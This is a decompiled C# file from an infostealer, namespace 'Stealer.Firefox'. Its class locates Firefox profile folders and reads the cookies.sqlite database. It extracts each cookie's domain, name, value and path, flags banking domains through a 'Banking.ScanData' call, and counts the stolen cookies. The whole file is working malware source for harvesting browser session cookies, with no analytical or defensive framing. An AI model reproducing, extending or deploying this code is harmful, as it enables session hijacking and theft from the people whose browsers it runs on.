using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer.Firefox
{
	// Token: 0x0200001B RID: 27
	internal sealed class cCookies
	{
		// Token: 0x06000088 RID: 136 RVA: 0x00005F20 File Offset: 0x00004120
		private static string GetCookiesDBPath(string path)
		{
			try
			{
				string text = path + "\\Profiles";
				bool flag = Directory.Exists(text);
				if (flag)
				{
					foreach (string text2 in Directory.GetDirectories(text))
					{
						bool flag2 = File.Exists(text2 + "\\cookies.sqlite");
						if (flag2)
						{
							return text2 + "\\cookies.sqlite";
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x06000089 RID: 137 RVA: 0x00005FC0 File Offset: 0x000041C0
		public static List<Cookie> Get(string path)
		{
			List<Cookie> list = new List<Cookie>();
			try
			{
				string cookiesDBPath = cCookies.GetCookiesDBPath(path);
				SQLite sqlite = SqlReader.ReadTable(cookiesDBPath, "moz_cookies");
				bool flag = sqlite == null;
				if (flag)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Cookie cookie = default(Cookie);
					cookie.domain = sqlite.GetValue(i, 4);
					cookie.name = sqlite.GetValue(i, 2);
					cookie.value = sqlite.GetValue(i, 3);
					cookie.sPath = sqlite.GetValue(i, 5);
					cookie.expirationDate = cBrowserUtils.UnixTimeStampToDateTime(Convert.ToDouble(sqlite.GetValue(i, 6)), false).ToString();
					Banking.ScanData(cookie.domain);
					Counter.Cookies++;
					list.Add(cookie);
				}
				return list;
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex);
			}
			return new List<Cookie>();
		}
	}
}
